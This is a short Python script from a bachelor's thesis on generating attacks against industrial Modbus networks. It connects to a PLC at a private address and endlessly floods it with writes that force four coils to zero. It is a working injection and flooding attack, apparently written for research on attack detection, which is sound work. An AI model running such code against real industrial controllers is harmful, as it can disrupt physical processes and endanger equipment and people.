# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: injection-simple.py 
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description: Program is injecting wrong modbus packets.

from pyModbusTCP.client import ModbusClient

# Device that i am attacking 
SERVER_HOST_2 = "192.168.88.252"  # PLC2
SERVER_PORT = 502

# establish tcp connection with device 
plc = ModbusClient(host=SERVER_HOST_2, port=SERVER_PORT)
plc.open()


# It just spams logical 0 to all PLC registers  
while True:
    plc.write_multiple_coils(0, [False, False, False, False])




    